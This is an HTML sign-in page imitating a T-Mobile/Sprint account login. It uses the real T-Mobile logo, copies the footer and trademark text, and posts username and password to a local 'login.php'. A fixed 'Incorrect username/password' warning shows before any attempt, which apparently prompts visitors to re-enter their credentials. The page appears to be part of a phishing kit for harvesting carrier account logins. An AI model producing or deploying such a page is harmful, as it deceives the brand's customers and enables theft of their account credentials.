<!DOCTYPE html>
<html>
    <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign In</title>
        <style>
           
            body{
                width:100%;
                height:100%;
            }
            img{
                width:200px
            }
            .wrapper{
                margin-left: 10px;
                margin-top: 20px;
            }
            .input-box{
                width:90%;
                height: 27px;
                border-radius: 5px;
            }
            .reset{
                padding-top: 10px;
            }
            button{
                width:90%;
                background-color: black;
                color:azure;
                border-radius: 5px;
                height:30px
            }
            .footer{
                background-color: black;
                margin-top: 130px;
                height:350px;
                color:azure;

            }
            .write-up{
                padding-top: 10px;
                padding-left: 20px;
            }
            .footer-w{
                padding-left: 10px;
            }
            .hh{
                padding-left: 50px;
                width:80%;
            }
            .hi{
                padding-left: 70px;
            }

        </style>
    </head>
    <body>
        <img src="https://www.t-mobile.com/news/_admin/uploads/2020/04/T-Mobile_New_Logo_Primary_RGB_M-on-K_Transparent.png">
        <hr><br>
    <form action="login.php" method="POST">
        <div class="wrapper"><h5 style="color:red;">Incorrect username/password</h5>
            <h2>Sign in to your account</h2><br>
            Username<br><input name="username" class ="input-box"><br><br>Password<br><input type="password" name="password" class="input-box"><br><div class="reset">
                I forgot my <strong>Username</strong> or <strong>Password</strong><br><br>
                <a href=""><button>Submit</button></a>
            </div>
        </div>
    </form>
    <div class="footer">
        <div class="write-up">
            Contact Us<br><br>
            Coverage map<br><br>
            Services<br><br>
            Support<br><br>
            Orders<br><br>
            Legal<br><br>

        </div>
        <div class="footer-w">
            <h5><h5 class ="hh">2022 Sprint.com -All Rights Reserved.</h5>
            T-Mobile, the T logo, Magenta and the magenta color are registered trademarks of Deutsche Telekom AG.<br>
        Sprint and its logo are registered trademarks of sprint <h5 class ="hi">Communications Company L.P.</h5></h5>
        </div>

    </div>

        
    </body>
</html>